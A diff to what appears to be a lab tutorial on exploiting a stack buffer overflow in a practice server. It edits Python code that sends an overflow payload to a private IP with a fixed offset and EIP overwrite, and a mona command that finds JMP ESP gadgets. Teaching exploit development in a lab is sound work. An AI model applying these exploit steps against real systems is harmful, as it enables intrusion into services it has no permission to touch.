@@ -175,9 +175,6 @@ import socket
 s = socket.socket()
 s.connect(("192.168.177.130", 9999))
 
-# Create a cyclic pattern using MSF pattern_create
-# In Kali: $ msf-pattern_create -l 2984
-
 total_length = 2984
 offset = 2003
 New_EIP = b"BBBB"
@@ -196,7 +193,7 @@ s.send(payload)
 s.close()
 ```
 
-In Immunity Debugger, we should see EIP filled with 42424242 (our "B"s) And our Stack filled with our "C"s - confirming we have precise control!
+In Immunity Debugger, we should see EIP filled with 42424242 (our "B"s) And the Stack filled with our "C"s - confirming we have precise control!
 
 ![control](Images/image8.png)
 
@@ -244,7 +241,9 @@ Now we need to find a JMP ESP instruction to use as our return address. We'll us
 !mona jmp -r esp -cpb "\x00"
 ```
 
-This command finds all JMP ESP instructions, excluding those with addresses containing null bytes. We'll find an address like `0x625011af` in `essfunc.dll`.
+This command finds all JMP ESP instructions, excluding those with addresses containing null bytes. We'll find an address like `0x62501203`.
+
+![mona](Images/image9.png)
 
 ## Step 7: Building the Final Exploit
 
